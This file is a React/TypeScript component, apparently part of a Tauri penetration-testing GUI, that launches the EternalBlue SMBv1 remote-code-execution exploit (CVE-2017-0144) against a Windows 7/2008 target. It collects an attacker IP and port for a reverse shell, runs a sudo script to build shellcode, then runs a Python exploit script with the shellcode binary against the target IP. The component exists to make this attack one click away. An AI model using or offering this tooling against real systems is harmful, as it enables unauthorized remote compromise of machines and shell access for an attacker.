import { Button, LoadingOverlay, NativeSelect, NumberInput, Stack, TextInput, Title } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { Child, Command } from "@tauri-apps/api/shell";

interface FormValues {
    hostIP: string;
    targetIP: string;
    hostPort: number;
    targetPort: number;
    architecture: string;
}

export function CVE20170144() {
    const [loading, setLoading] = useState(false);

    const [output, setOutput] = useState("");
    const [selectedArchitecture, setSelectedArchitecture] = useState("x64");

    let form = useForm({
        initialValues: {
            hostIP: "",
            targetIP: "",
            hostPort: 4444,
            targetPort: 445,
            architecture: "",
        },
    });

    const onSubmit = async (values: FormValues) => {
        setLoading(true);

        const args = [
            "bash",
            "/usr/share/ddt/CVE-2017-0144/Shellcode/create_shell.sh",
            `${values.hostIP}`,

            `${values.hostPort}`,
        ];

        try {
            const output = await CommandHelper.runCommand("sudo", args);
            setOutput(output);
        } catch (e: any) {
            setOutput(e);
        }

        setOutput(output);

        const exploit = ["/usr/share/ddt/CVE-2017-0144/CVE-2017-0144.py", `${values.targetIP}`];
        if (values.architecture === "x64") {
            exploit.push("/usr/share/ddt/CVE-2017-0144/sc_x64.bin");
        } else if (values.architecture === "x86") {
            exploit.push("/usr/share/ddt/CVE-2017-0144/sc_x86.bin");
        }

        const exploitOutput = await CommandHelper.runCommand("python3", exploit);

        setOutput(exploitOutput);

        setLoading(false);
    };

    const clearOutput = useCallback(() => {
        setOutput("");
    }, [setOutput]);

    return (
        <form onSubmit={form.onSubmit((values) => onSubmit({ ...values, architecture: selectedArchitecture }))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                <Title>Windows 7/2008 SMBv1 RCE (CVE-2017-0144)</Title>
                <TextInput
                    label={"Host IP (your machine, for the reverse shell)"}
                    required
                    {...form.getInputProps("hostIP")}
                />

                <NumberInput
                    label={"Host port (Start your nectcat listener for reverse shell)"}
                    {...form.getInputProps("hostPort")}
                />
                <TextInput label={"Target IP"} required {...form.getInputProps("targetIP")} />
                <NumberInput disabled label={"Target port"} required {...form.getInputProps("targetPort")} />
                <NativeSelect
                    value={selectedArchitecture}
                    onChange={(e) => setSelectedArchitecture(e.target.value)}
                    title={"Architecture option"}
                    data={["x64", "x86"]}
                    required
                    label={"Pick an architecture"}
                />
                <Button type={"submit"}>Exploit</Button>
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
            </Stack>
        </form>
    );
}
export default CVE20170144;
